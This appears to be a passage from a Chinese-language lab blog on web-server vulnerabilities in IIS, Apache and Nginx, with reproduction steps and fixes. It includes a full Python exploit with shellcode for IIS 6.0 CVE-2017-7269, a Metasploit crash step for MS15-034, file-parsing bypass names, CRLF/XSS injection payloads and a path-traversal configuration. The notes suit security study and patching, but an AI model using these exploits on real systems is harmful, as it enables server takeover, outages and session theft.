class="comment">#https://github.com/guhuisec/IIS6.0-RCE-CVE-2017-7269-Echo-PoC/blob/master/CVE-2017-7269_remote_echo.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">port</span>):</span><br><span class="line">    pay = <span class="string">&#x27;PROPFIND / HTTP/1.1\r\nHost: localhost:&#x27;</span> + port + <span class="string">&#x27;\r\nContent-Length: 0\r\n&#x27;</span></span><br><span class="line">    pay += <span class="string">&#x27;If: &lt;http://localhost:&#x27;</span> + port + <span class="string">&#x27;/aaaaaaa&#x27;</span></span><br><span class="line">    pay += <span class="string">&#x27;\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac&#x27;</span></span><br><span class="line">    pay += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">    pay += <span class="string">&#x27; (Not &lt;locktoken:write1&gt;) &lt;http://localhost:&#x27;</span> + port + <span class="string">&#x27;/bbbbbbb&#x27;</span></span><br><span class="line">    pay += <span class="string">&#x27;\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81&#x27;</span></span><br><span class="line">    shellcode = <span class="string">&#x27;VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJIOPKSKPKPTKLITKKQDKU0G0KPKPM00QQXI8KPM0M0K8KPKPKPM0QNTKKNU397N30WRJLMSSI7LNR72JPTKOXPZKQH0CR615NMNRP0NQNWNMOGP206NYKPOSRORN3D35RND4NMPTD9RP2ENZMPT4352XCDNOS8BTBMBLLMKZOSROBN441URNT4NMPL2ERNS7SDBHOJOBNVO0LMLJLMKZ0HOXOY0TO0OS260ENMNRP0NQOGNMOGOB06OIMP2345RCS3RET3D3M0KLK8SRM0KPM0C0SYK5NQWP2DDK0PNP4KQBLLTKQBMDDKD2MXLOGG0JO6NQKO6LOLQQSLKRNLMP7QXOLMM18G9RJRR2R74KQBLP4K0JOL4K0LN1RXK3PHKQHQ0Q4K29MPM19CTKQ9MH9SOJQ94KNTTKKQJ6P1KOFLY1XOLMKQXGNX9PD5KFM33MKHOKSMO42UJDPXTKB8O4KQIC1V4KLL0K4K0XMLKQXSTKKTTKKQJ0CYQ4O4MTQKQK1QR90Z0QKOYPQOQOQJ4KLRJKTM1MWKOWMCBR2OQZKPPSKOYEKPA&#x27;</span></span><br><span class="line">    pay += shellcode</span><br><span class="line">    pay += <span class="string">&#x27;&gt;\r\n\r\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_pack</span>(<span class="params">ip, port=<span class="number">80</span></span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip, port))</span><br><span class="line">    time_tick = time.time()</span><br><span class="line">    sock.send(generate_payload(<span class="built_in">str</span>(port)))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = sock.recv(<span class="number">80960</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span> data</span><br><span class="line"></span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> -<span class="number">1</span> == data.find(<span class="string">&#x27;HHIT CVE-2017-7269 Success&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">2</span> == <span class="built_in">len</span>(sys.argv):</span><br><span class="line">    <span class="built_in">print</span> send_pack(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> send_pack(sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]))</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>漏洞修复</strong></p>
<ol>
<li><p>WebDAV 服务</p>
</li>
<li><p>使用相关防护设备</p>
</li>
<li><p>安装修复补丁（KB3042553）</p>
</li>
</ol>
</li>
</ul>
<h4 id="HTTP-SYS远程代码执行-MS15-034"><a href="#HTTP-SYS远程代码执行-MS15-034" class="headerlink" title="HTTP.SYS远程代码执行 (MS15-034)"></a>HTTP.SYS远程代码执行 (MS15-034)</h4><ul>
<li><p><strong>介绍</strong></p>
<p>HTTP 协议堆栈 (HTTP.sys) 中存在一个远程代码执行漏洞，当 HTTP.sys 错误地解析特制 HTTP 请求时，会导致该漏洞。成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</p>
</li>
<li><p><strong>范围</strong></p>
<p>对于 Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2 的所有受支持版本，此安全更新的等级为“严重”。</p>
</li>
<li><p><strong>复现</strong></p>
<p>win7上安装iis7.5，步骤见<a target="_blank" rel="noopener" href="https://jingyan.baidu.com/article/aa6a2c14e8c2080d4c19c40a.html">https://jingyan.baidu.com/article/aa6a2c14e8c2080d4c19c40a.html</a></p>
<p>curl命令测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.80.130 -H &quot;Host: 192.168.80.130&quot; -H &quot;Range: bytes=0-18446744073709551615&quot;</span><br></pre></td></tr></table></figure>

<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220505181312281.png" alt="image-20220505181312281"></p>
<p> 若IIS服务器返回“Requested Range Not Satisfiable”，则是存在漏洞，否则如果返回”The request has an invalid header name“，则说明漏洞已经修补。</p>
<p>利用msf测试（kali）</p>
<ul>
<li>运行<code>msfconsole</code></li>
<li><code>search ms15-034</code></li>
<li>利用模板二 <code>use auxiliary/dos/http/ms15_034_ulonglongadd</code></li>
<li><code>set rhosts 192.168.52.130</code></li>
<li><code>run</code>  </li>
<li>win7蓝屏重启</li>
</ul>
</li>
<li><p><strong>修复</strong></p>
<ol>
<li><p>临时办法</p>
<p>禁用IIS内核缓存</p>
</li>
<li><p>官方补丁</p>
<p>官方补丁下载：<a target="_blank" rel="noopener" href="https://support.microsoft.com/zh-cn/kb/3042553">https://support.microsoft.com/zh-cn/kb/3042553</a></p>
</li>
</ol>
</li>
</ul>
<h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><ul>
<li><p><strong>漏洞</strong></p>
<p>IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。这一漏洞有两种完全不同的利用方式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/test.asp/test.jpg     //新建一个名为 &quot;test.asp&quot; 的目录，该目录中的任何文件都被 IIS 当作 asp 程序执行</span><br><span class="line">test.asp;.jpg    //上传名为 &quot;test.asp;.jpg&quot; 的文件，虽然该文件真正的后缀名是 &quot;.jpg&quot;, 但由于含有特殊符号 &quot;;&quot; ，仍会被 IIS 当做 asp 程序执行</span><br></pre></td></tr></table></figure>

<p>IIS7.5 文件解析漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.jpg/.php</span><br></pre></td></tr></table></figure>

<p>URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，而 php 又默认开启  “cgi.fix_pathinfo”, 会对文件进行 “ 修理 ”(举个例子，当 php 遇到路径  “&#x2F;aaa.xxx&#x2F;bbb.yyy” 时，若 “&#x2F;aaa.xxx&#x2F;bbb.yyy” 不存在，则会去掉最后的 “bbb.yyy” ，然后判断  “&#x2F;aaa.xxx” 是否存在，若存在，则把 “&#x2F;aaa.xxx” 当作文件。)</p>
<p>若有文件 test.jpg ，访问时在其后加 &#x2F;.php ，便可以把 “test.jpg&#x2F;.php” 交给 php ， php 修理文件路径 “test.jpg&#x2F;.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。</p>
</li>
<li><p><strong>修复</strong></p>
<ol>
<li><p>对新建目录文件名进行过滤，不允许新建包含‘.’的文件</p>
</li>
<li><p>取消网站后台新建目录的功能，不允许新建目录</p>
</li>
<li><p>限制上传的脚本执行权限，不允许执行脚本</p>
</li>
<li><p>过滤.asp&#x2F;xm.jpg，通过ISApi组件过滤</p>
</li>
</ol>
</li>
</ul>
<h2 id="Apache漏洞"><a href="#Apache漏洞" class="headerlink" title="Apache漏洞"></a>Apache漏洞</h2><ul>
<li><p><strong>简介</strong></p>
<p>Apache 是世界使用排名第一的Web 服务器软件。它可以运行在几乎所有广泛使用的 计算机平台上，由于其 跨平台  和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将 Perl&#x2F; Python等  解释器编译到服务器中。</p>
</li>
</ul>
<h3 id="解析漏洞-1"><a href="#解析漏洞-1" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><p>Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在mime.tyoes内），则继续向左识别，当我们请求这样一个文件：<code>shell.php.xxx.yyy</code></p>
<p>yyy无法识别，向左</p>
<p>xxx无法识别，向左</p>
<p>php识别成功，shell.php，php处理</p>
<ul>
<li><p><strong>复现</strong></p>
<p>略，上传html</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;/!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;CTFshow upload&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CTFshow File Upload Template&lt;/h2&gt;</span><br><span class="line">	&lt;form  action=&quot;http://ip/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;file&quot; name=&quot;file&quot;/&gt;</span><br><span class="line">		 &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>漏洞修复</strong></p>
<p>将AddHandler application&#x2F;x-httpd-php .php的配置文件删除</p>
</li>
</ul>
<h2 id="Nginx漏洞"><a href="#Nginx漏洞" class="headerlink" title="Nginx漏洞"></a>Nginx漏洞</h2><ul>
<li><p><strong>简介</strong></p>
<p>Nginx 是一款 轻量级的 Web 服务器、 反向代理 服务器及 电子邮件（IMAP&#x2F;POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少， 并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好</p>
</li>
</ul>
<h3 id="解析漏洞-2"><a href="#解析漏洞-2" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><ul>
<li><p><strong>介绍</strong></p>
<ul>
<li>对任意文件名，在后面添加&#x2F;任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg&#x2F;x.php 进行解析攻击。</li>
<li><strong>对低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。</strong>（没有复现，影响版本：Nginx 0.8.41 ~ 1.4.3 &#x2F; 1.5.0 ~ 1.5.7）</li>
</ul>
</li>
<li><p><strong>复现</strong></p>
<p><strong>环境搭建</strong></p>
<p>利用docker容器</p>
<ul>
<li>docker pull ubuntu:14.04.5</li>
<li>docker run -d -it -p 本机端口:80 ubuntu:14.04.5 </li>
<li>docker exec -it 【镜像名称】 &#x2F;bin&#x2F;bash</li>
</ul>
<p>安装环境</p>
<ul>
<li>apt-get update # 更新源(如果出现<code>Err http://archive.ubuntu.com trusty InRelease</code>,可以用<code>docker run -d -it --net=host ubuntu:14.04.5  </code>#直接用宿主机端口；可以查查docker的四种网络模式)</li>
<li>apt-get install vim # 安装vim(可有可无，可以用vi)</li>
<li>apt-get install nginx # 安装nginx</li>
<li>service nginx start # 启动nginx服务</li>
<li>apt-get install php5-fpm # 安装php5-fp</li>
</ul>
<p>配置方法</p>
<ul>
<li><p>刚装好的Nginx不能解析php，修改配置文件</p>
<p>vim &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;default</p>
<p>将注释删除</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506212729791.png" alt="image-20220506212729791"></p>
</li>
</ul>
<p>启动web服务</p>
<ul>
<li>&#x2F;etc&#x2F;init.d&#x2F;php5-fpm start</li>
<li>在<code>/usr/share/nginx/html # 默认web目录</code>写一个php测试文件</li>
<li>重启nginx      <code>nginx -s reload</code></li>
</ul>
<p><strong>开始测试</strong></p>
<ul>
<li>创建1.jpg文件，访问</li>
</ul>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506182015511.png" alt="image-20220506182015511"></p>
<ul>
<li>访问1.jpg&#x2F;1.php</li>
</ul>
<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506182037345.png" alt="image-20220506182037345" style="zoom: 150%;" />

<p>原理与iis解析漏洞差不多，都是”修理”功能<code>cgi.fix_pathinfo</code>，该值默认为1，表示开启”修理模式”，其配置在<code>/etc/php5/fpm/php.ini</code>的768行处</p>
<p>Nginx拿到文件路径&#x2F;1.jpg&#x2F;1.php后，一看后缀是.php，便认为该文件是php文件，转交给php去处理。php一看&#x2F;1.jpg&#x2F;1.php不存在，便删去最后的&#x2F;1.php，又看&#x2F;1.jpg存在，便把&#x2F;1.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件，于是返回“Access denied.”</p>
<ul>
<li>配置&#x2F;etc&#x2F;php5&#x2F;fpm&#x2F;pool.d&#x2F;<a target="_blank" rel="noopener" href="http://www.conf中的limit_extensions允许解析其他的格式文件(在364行)/">www.conf中的limit_extensions允许解析其他的格式文件(在364行)</a></li>
</ul>
<p>将security.limit_extensions处修改<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506182632418.png" alt="image-20220506182632418"></p>
<p>重启fpm服务 <code>service php5-fpm restart</code></p>
<p>再次访问1.jpg&#x2F;1.php</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506184135949.png" alt="image-20220506184135949"></p>
</li>
<li><p><strong>修复</strong></p>
<ol>
<li><p>将php.ini文件中的cgi.fix_pathinfo的值设为0.这样php在解析1.php&#x2F;1.jpg这样的目录时，只要1.jpg不存在就会显示404；(在低版本可以用%00解析，无需cgi.fix_pathinfo)</p>
</li>
<li><p>将&#x2F;etc&#x2F;php5&#x2F;fpm&#x2F;pool.d&#x2F;<a target="_blank" rel="noopener" href="http://www.conf中security.limit_ectensions后面的值设为.php/">www.conf中security.limit_ectensions后面的值设为.php</a></p>
</li>
</ol>
</li>
</ul>
<h3 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h3><ul>
<li><p><strong>介绍</strong></p>
<p>CRLF是”回车+换行”(\r\n)的简称。在HTTP协议中,HTTP header与HTTP  Body是用两个CRLF分隔的,浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以,一旦我们能够控制HTTP消息头中的字符,注入一些恶意的换行,这样我们就能注入一些会话Cookie或者HTML代码。CRLF漏洞常出现在Location与Set-cookie消息头中。</p>
</li>
<li><p><strong>复现</strong></p>
<ol>
<li><p>修改nginx的配置文件(如果还是上文的配置则在<code>/etc/nginx/sites-available/default</code>),在如下图位置添加配置<code>return 302 https://$host$url;</code>,此配置实现了强制跳转的功能,当用户访问nginx服务器时由于此配置的存在会被强制跳转到以https协议访问之前访问的链接</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506193008301.png" alt="image-20220506193008301"></p>
<p>重启ngnix服务,<code>nginx -s reload</code></p>
</li>
<li><p>测试poc <code>http://x.x.x.x/%0A%0DSet-Cookie:%20a=1%0A%0DSet-cookie:JSPSESSID%3Dwooyun</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506194006550.png" alt="image-20220506194006550"></p>
<p>302页面存在构造 Set-0cookie:a&#x3D;1与Set-cookie:JSPSESSID&#x3D;wooyun</p>
</li>
<li><p>利用xss填入<code>http://x.x.x.x:8080/%0D%0ASet-Cookie:%20a=1%0A%0A&lt;img src=1 onerror=alert(/xss/)&gt; </code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506194421991.png" alt="image-20220506194421991"></p>
</li>
</ol>
</li>
<li><p><strong>修复</strong></p>
<p>删除该配置</p>
</li>
</ul>
<h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><ul>
<li><p><strong>介绍</strong></p>
<p>Nginx反向代理，静态文件存储在&#x2F;home&#x2F;下，而访问时需要在url中输入files，配置文件中&#x2F;files没有用&#x2F;闭合，导致可以穿越至上层目录。</p>
</li>
<li><p><strong>复现</strong></p>
<p>在ngnix配置文件处<code>/etc/nginx/sites-available/default</code>添加</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location /files &#123;</span><br><span class="line">        autoindex on;</span><br><span class="line">        alias /home/;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506213321933.png" alt="image-20220506213321933"></p>
<p>访问</p>
<p>x.x.x.x&#x2F;files</p>
